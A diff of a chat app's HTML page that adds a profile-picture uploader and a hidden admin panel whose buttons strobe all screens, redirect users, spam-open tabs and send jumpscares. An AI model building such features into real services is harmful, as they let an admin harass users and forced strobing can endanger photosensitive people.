@@ -2,37 +2,44 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Sharcord</title>
+  <title>Sharcord Chat</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="chat-container">
-    <div id="chat-box" style="overflow-y: scroll; height: 400px; border: 1px solid #ccc; padding: 10px;">
-      <!-- Messages go here -->
-    </div>
+  <div id="chat-container">
+    <div id="messages"></div>
     <form id="message-form">
-      <input id="message-input" autocomplete="off" placeholder="Type a message..." />
-      <button>Send</button>
+      <input id="m" autocomplete="off" placeholder="Type a message..." /><button>Send</button>
     </form>
-    <button onclick="logout()">Logout</button>
-  </div>
 
-  <div id="admin-panel" style="margin-top:20px;">
-    <h2>Admin Panel</h2>
-    <input id="target-user" placeholder="Username to target"><br><br>
-    <input id="redirect-url" placeholder="Redirect URL"><br><br>
-    <input id="spam-count" placeholder="Tabs to open"><br><br>
-    <input id="announcement-text" placeholder="Announcement text"><br><br>
-    <input id="jumpscare-image" placeholder="Jumpscare Image URL"><br><br>
-    <input id="jumpscare-audio" placeholder="Jumpscare Audio URL"><br><br>
-    
-    <button onclick="strobeScreens()">Strobe Screens</button>
-    <button onclick="timeoutUser()">Timeout User</button>
-    <button onclick="redirectUser()">Redirect User</button>
-    <button onclick="spamTabs()">Spam Tabs</button>
-    <button onclick="sendAnnouncement()">Send Announcement</button>
-    <button onclick="sendJumpscare()">Send Jumpscare</button>
-    <button onclick="clearChat()">Clear Chat</button>
+    <!-- 👇 New Profile Picture Changer (no UI change, fits in) -->
+    <div id="change-pfp" style="margin-top: 20px;">
+      <h3>Change Profile Picture</h3>
+      <input type="file" id="pfp-input" accept="image/*">
+      <button type="button" onclick="changePfp()">Upload</button>
+    </div>
+
+    <!-- 👑 Admin Panel (only visible for admins) -->
+    <div id="admin-panel" style="display:none; margin-top: 20px;">
+      <h2>Admin Panel</h2>
+
+      <input type="text" id="targetUser" placeholder="Username for actions">
+      <input type="text" id="redirectUrl" placeholder="Redirect URL">
+      <input type="text" id="spamCount" placeholder="Spam tab count">
+      <input type="text" id="announcementText" placeholder="Announcement Text">
+      <input type="text" id="timeoutDuration" placeholder="Timeout (sec)">
+      <input type="text" id="jumpscareImage" placeholder="Jumpscare Image URL">
+      <input type="text" id="jumpscareAudio" placeholder="Jumpscare Audio URL">
+
+      <button onclick="strobeEffect()">Strobe All Screens</button>
+      <button onclick="timeoutUser()">Timeout User</button>
+      <button onclick="kickUser()">Kick User</button>
+      <button onclick="redirectUser()">Redirect User</button>
+      <button onclick="spamTabs()">Spam Tabs</button>
+      <button onclick="clearChat()">Clear Chat</button>
+      <button onclick="sendAnnouncement()">Send Announcement</button>
+      <button onclick="sendJumpscare()">Send Jumpscare</button>
+    </div>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
